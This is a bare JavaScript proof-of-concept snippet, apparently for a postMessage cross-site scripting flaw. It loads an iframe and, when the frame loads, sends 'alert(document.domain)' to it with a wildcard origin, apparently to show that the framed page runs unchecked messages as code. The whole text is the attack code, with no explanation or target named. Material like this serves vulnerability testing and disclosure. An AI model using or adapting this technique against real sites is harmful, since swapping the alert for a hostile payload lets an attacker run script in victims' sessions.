var frame = document.getElementById('frame');
window.poc = frame.contentWindow;
frame.onload = function() {
window.poc.postMessage('alert(document.domain)', '*');
};